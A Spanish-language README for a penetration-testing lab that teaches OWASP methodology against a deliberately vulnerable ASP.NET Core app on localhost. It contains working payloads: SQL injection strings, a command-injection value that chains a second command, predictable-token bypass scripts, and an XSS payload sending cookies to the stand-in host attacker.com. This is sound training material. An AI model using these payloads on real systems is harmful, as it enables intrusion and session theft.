# Laboratorio 1: Penetration Testing con Metodología OWASP

## 📋 Descripción General

Este laboratorio implementa una evaluación completa de seguridad siguiendo metodologías OWASP profesionales. Los participantes aprenderán a ejecutar pruebas de penetración sistemáticas, identificar vulnerabilidades críticas y documentar hallazgos de forma profesional.

## 🎯 Objetivos del Laboratorio

### Objetivos Principales
- **Dominar Metodología OWASP**: Aplicar OWASP Testing Guide v4.2 de forma sistemática
- **Ejecutar Ataques Controlados**: Simular ataques reales en ambiente seguro
- **Documentar Hallazgos**: Crear reportes de nivel profesional
- **Evaluar Riesgo**: Aplicar CVSS 3.1 para calificación de vulnerabilidades

### Competencias Desarrolladas
1. **Reconnaissance y Information Gathering**
2. **Vulnerability Assessment Sistemático** 
3. **Exploitation Controlada**
4. **Risk Assessment y Priorización**
5. **Professional Security Documentation**

## 🛠️ Tecnologías y Herramientas

### Stack Tecnológico
- **.NET Core 9.0**: Aplicación vulnerable de demostración
- **ASP.NET Core Web API**: Framework de desarrollo
- **Entity Framework**: ORM con vulnerabilidades intencionales
- **SQL Server**: Base de datos para testing de inyección

### Herramientas de Testing
- **Nmap**: Network discovery y port scanning
- **curl**: HTTP testing y exploitation
- **PowerShell**: Automatización de pruebas
- **Burp Suite Community**: Web application testing (opcional)

## 📁 Estructura del Proyecto

```
Laboratorio01-PenetrationTesting/
├── README.md                          # Esta documentación
├── VulnerableWebApp/                   # Aplicación objetivo vulnerable
│   ├── Program.cs                      # Configuración principal con vulnerabilidades
│   ├── Controllers/
│   │   └── VulnerableController.cs     # Endpoints vulnerables para testing
│   ├── Models/                         # Modelos de datos
│   └── VulnerableWebApp.csproj         # Configuración del proyecto
├── TestingTools/                       # Scripts de automatización
│   ├── reconnaissance.ps1              # Scripts de reconocimiento
│   ├── vulnerability-scan.ps1          # Escaneos automatizados
│   └── exploitation-tests.ps1          # Tests de explotación
├── Reports/                            # Documentación generada
│   ├── executive-summary.md            # Resumen ejecutivo
│   ├── technical-findings.md           # Hallazgos técnicos detallados
│   ├── vulnerability-matrix.csv        # Matriz de vulnerabilidades
│   └── remediation-plan.md             # Plan de remediación
└── Documentation/                      # Documentación adicional
    ├── owasp-methodology.md            # Guía de metodología OWASP
    ├── cvss-scoring.md                 # Guía de scoring CVSS
    └── best-practices.md               # Mejores prácticas de testing
```

## 🔍 Vulnerabilidades Implementadas

### Vulnerabilidades Críticas (CVSS 9.0+)
1. **SQL Injection (CWE-89)**
   - **Ubicación**: `/api/Vulnerable/user/{id}`
   - **Descripción**: Concatenación directa de entrada de usuario en consultas SQL
   - **Impacto**: Extracción completa de base de datos
   - **CVSS**: 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

2. **Authentication Bypass (CWE-287)**
   - **Ubicación**: `/api/Vulnerable/admin/secrets`
   - **Descripción**: Tokens JWT predictibles y validación débil
   - **Impacto**: Acceso no autorizado a funciones administrativas
   - **CVSS**: 9.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)

3. **Command Injection (CWE-78)**
   - **Ubicación**: `/api/Vulnerable/ping`
   - **Descripción**: Ejecución directa de comandos con entrada de usuario
   - **Impacto**: Compromiso completo del servidor
   - **CVSS**: 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

### Vulnerabilidades Altas (CVSS 7.0-8.9)
4. **Cross-Site Scripting (CWE-79)**
   - **Ubicación**: `/api/Vulnerable/search`
   - **Descripción**: Salida no codificada permite inyección de scripts
   - **Impacto**: Robo de cookies de sesión y phishing
   - **CVSS**: 6.1 (AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

5. **Information Disclosure (CWE-200)**
   - **Ubicación**: `/api/Vulnerable/debug/config`
   - **Descripción**: Exposición de información sensible de configuración
   - **Impacto**: Revelación de credenciales y URLs internas
   - **CVSS**: 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

## 🚀 Guía de Instalación y Configuración

### Prerrequisitos
```powershell
# Verificar .NET Core 9
dotnet --version  # Debe mostrar 9.0.x

# Verificar herramientas de testing
nmap --version
curl --version
```

### Instalación Paso a Paso

#### 1. Configurar Aplicación Vulnerable
```powershell
# Navegar al directorio del laboratorio
cd Laboratorio01-PenetrationTesting/VulnerableWebApp

# Restaurar dependencias
dotnet restore

# Compilar el proyecto
dotnet build

# Ejecutar la aplicación
dotnet run
```

#### 2. Verificar Despliegue
```powershell
# Verificar que la aplicación esté ejecutándose
curl http://localhost:5000/api/Vulnerable/debug/config

# Debería retornar configuración de debug (vulnerabilidad intencional)
```

#### 3. Configurar Herramientas de Testing
```powershell
# Navegar a directorio de herramientas
cd ../TestingTools

# Ejecutar script de verificación de ambiente
.\verify-environment.ps1
```

## 📚 Metodología OWASP Aplicada

### Fase 1: Information Gathering (15 minutos)
**Objetivo**: Recopilar información sobre la aplicación objetivo

```powershell
# Descubrimiento de servicios
nmap -sV localhost -p 1-10000

# Enumeración de endpoints
curl -X GET http://localhost:5000/swagger/index.html

# Análisis de headers de seguridad
curl -I http://localhost:5000/api/Vulnerable/user/1
```

**Entregables**:
- Lista de puertos abiertos y servicios
- Mapa de endpoints de la aplicación
- Análisis de headers de seguridad

### Fase 2: Authentication Testing (20 minutos)
**Objetivo**: Evaluar mecanismos de autenticación y autorización

```powershell
# Test de enumeración de usuarios
curl -X POST http://localhost:5000/api/Vulnerable/login `
  -H "Content-Type: application/json" `
  -d '{"username":"admin","password":"wrong"}'

# Test de bypass de autenticación
curl -X GET "http://localhost:5000/api/Vulnerable/admin/secrets?token=admin_1_1640995200"
```

**Entregables**:
- Resultados de enumeración de usuarios
- Análisis de tokens de sesión
- Documentación de bypass de autenticación

### Fase 3: Input Validation Testing (25 minutos)
**Objetivo**: Identificar vulnerabilidades de validación de entrada

```powershell
# Testing SQL Injection
curl -X GET "http://localhost:5000/api/Vulnerable/user/1' OR '1'='1"

# Testing XSS
curl -X GET "http://localhost:5000/api/Vulnerable/search?query=<script>alert('XSS')</script>"

# Testing Command Injection  
curl -X POST http://localhost:5000/api/Vulnerable/ping `
  -H "Content-Type: application/json" `
  -d '{"host":"127.0.0.1 && dir"}'
```

**Entregables**:
- Matriz de vulnerabilidades de entrada
- Payloads exitosos documentados
- Análisis de impacto por vulnerabilidad

### Fase 4: Business Logic Testing (15 minutos)
**Objetivo**: Evaluar lógica de negocio y control de acceso

```powershell
# Análisis de lógica de autorización
curl -X GET "http://localhost:5000/api/Vulnerable/admin/secrets" `
  -H "Authorization: Bearer user_2_1640995200"

# Test de manipulación de parámetros
curl -X GET "http://localhost:5000/api/Vulnerable/user/-1"
```

**Entregables**:
- Análisis de control de acceso
- Documentación de fallas de lógica de negocio
- Matriz de privilegios y permisos

## 📊 Scoring y Evaluación de Riesgo

### Metodología CVSS 3.1
Cada vulnerabilidad se evalúa usando el framework CVSS 3.1:

#### Métricas Base
- **Attack Vector (AV)**: Network, Adjacent, Local, Physical
- **Attack Complexity (AC)**: Low, High
- **Privileges Required (PR)**: None, Low, High
- **User Interaction (UI)**: None, Required
- **Scope (S)**: Unchanged, Changed
- **Impact (CIA)**: None, Low, High

#### Ejemplo de Cálculo
```
SQL Injection en /api/Vulnerable/user/{id}:
AV:N (Network) / AC:L (Low) / PR:N (None) / UI:N (None) / S:U (Unchanged) / C:H (High) / I:H (High) / A:H (High)
= CVSS 9.8 (Critical)
```

### Matriz de Riesgo Empresarial
| Severidad CVSS | Nivel de Riesgo | Tiempo de Remediación | Impacto Empresarial |
|----------------|-----------------|----------------------|-------------------|
| 9.0 - 10.0     | Crítico         | 0-24 horas          | $500K - $2M      |
| 7.0 - 8.9      | Alto           | 1-7 días            | $100K - $500K    |
| 4.0 - 6.9      | Medio          | 1-4 semanas         | $25K - $100K     |
| 0.1 - 3.9      | Bajo           | 1-3 meses           | <$25K            |

## 📋 Casos de Prueba Específicos

### TC-001: SQL Injection Testing
```powershell
# Caso de prueba: Boolean-based blind injection
$uri = "http://localhost:5000/api/Vulnerable/user/1' AND '1'='1"
$response1 = Invoke-RestMethod -Uri $uri

$uri = "http://localhost:5000/api/Vulnerable/user/1' AND '1'='2" 
$response2 = Invoke-RestMethod -Uri $uri

# Verificar diferencias en respuestas para confirmar vulnerabilidad
Compare-Object $response1 $response2
```

### TC-002: XSS Testing
```powershell
# Caso de prueba: Reflected XSS
$payload = "<script>document.location='http://attacker.com/'+document.cookie</script>"
$uri = "http://localhost:5000/api/Vulnerable/search?query=$([System.Web.HttpUtility]::UrlEncode($payload))"
$response = Invoke-RestMethod -Uri $uri

# Verificar si payload se refleja sin codificación
if ($response -like "*<script>*") {
    Write-Host "XSS Vulnerability Confirmed" -ForegroundColor Red
}
```

### TC-003: Authentication Bypass Testing
```powershell
# Caso de prueba: Token prediction
$timestamp = [int][double]::Parse((Get-Date -UFormat %s))
$predictedToken = "admin_1_$timestamp"

$headers = @{"Authorization" = "Bearer $predictedToken"}
$response = Invoke-RestMethod -Uri "http://localhost:5000/api/Vulnerable/admin/secrets" -Headers $headers

# Verificar acceso no autorizado
if ($response.Status -eq "Success") {
    Write-Host "Authentication Bypass Confirmed" -ForegroundColor Red
}
```

## 📈 Métricas de Éxito

### KPIs del Laboratorio
- **Cobertura de Testing**: ≥95% de endpoints evaluados
- **Detección de Vulnerabilidades**: 100% de vulnerabilidades plantadas identificadas
- **Tiempo de Ejecución**: ≤75 minutos para evaluación completa
- **Calidad de Documentación**: Reportes siguiendo estándares OWASP

### Criterios de Completación
✅ **Reconnaissance completo** - Servicios y endpoints mapeados
✅ **Vulnerabilidades identificadas** - Al menos 5 vulnerabilidades críticas/altas
✅ **Explotación demostrada** - PoCs funcionales para vulnerabilidades críticas
✅ **Scoring CVSS aplicado** - Todas las vulnerabilidades calificadas
✅ **Documentación generada** - Reporte ejecutivo y técnico completados

## 🔧 Troubleshooting

### Problemas Comunes

#### Error: "Puerto 5000 en uso"
```powershell
# Verificar procesos usando puerto 5000
netstat -ano | findstr :5000

# Terminar proceso si es necesario
taskkill /PID [PID_NUMBER] /F

# Usar puerto alternativo
dotnet run --urls="http://localhost:5001"
```

#### Error: "Nmap no encontrado"
```powershell
# Instalar Nmap usando Chocolatey
choco install nmap -y

# Verificar instalación
nmap --version
```

#### Error: "Acceso denegado a endpoints"
```powershell
# Verificar que la aplicación esté ejecutándose
Get-Process | Where-Object {$_.ProcessName -eq "VulnerableWebApp"}

# Verificar conectividad
Test-NetConnection -ComputerName localhost -Port 5000
```

## 🎓 Recursos de Aprendizaje

### Documentación OWASP
- [OWASP Testing Guide v4.2](https://owasp.org/www-project-web-security-testing-guide/)
- [OWASP Top 10 2021](https://owasp.org/Top10/)
- [OWASP ASVS 4.0](https://owasp.org/www-project-application-security-verification-standard/)

### Frameworks de Scoring
- [CVSS 3.1 Calculator](https://www.first.org/cvss/calculator/3.1)
- [CWE Database](https://cwe.mitre.org/)
- [CAPEC Attack Patterns](https://capec.mitre.org/)

### Herramientas Profesionales
- [Burp Suite Professional](https://portswigger.net/burp/pro)
- [OWASP ZAP](https://www.zaproxy.org/)
- [Nessus](https://www.tenable.com/products/nessus)

## 🏆 Certificación de Competencias

Al completar este laboratorio exitosamente, el participante habrá demostrado:

### Competencias Técnicas
- ✅ **OWASP Methodology**: Aplicación sistemática de guías OWASP
- ✅ **Vulnerability Assessment**: Identificación de vulnerabilidades complejas
- ✅ **Risk Analysis**: Evaluación de impacto usando CVSS 3.1
- ✅ **Tool Proficiency**: Uso efectivo de herramientas de testing

### Competencias Profesionales  
- ✅ **Technical Documentation**: Reportes de nivel enterprise
- ✅ **Risk Communication**: Traducción de riesgo técnico a impacto empresarial
- ✅ **Systematic Approach**: Metodología repetible y consistent
- ✅ **Ethical Testing**: Pruebas controladas dentro de límites apropiados

---

## 📞 Soporte y Contacto

**Instructor**: Jhonny Ramirez Chiroque  
**Curso**: Diseño Seguro de Aplicaciones (.NET en Azure)  
**Sesión**: 09 - Pruebas de Penetración y Auditorías Avanzadas  
**Fecha**: 25 de Julio de 2025

Para soporte técnico o consultas sobre el laboratorio, referirse a la documentación del curso o contactar durante las horas de sesión programadas.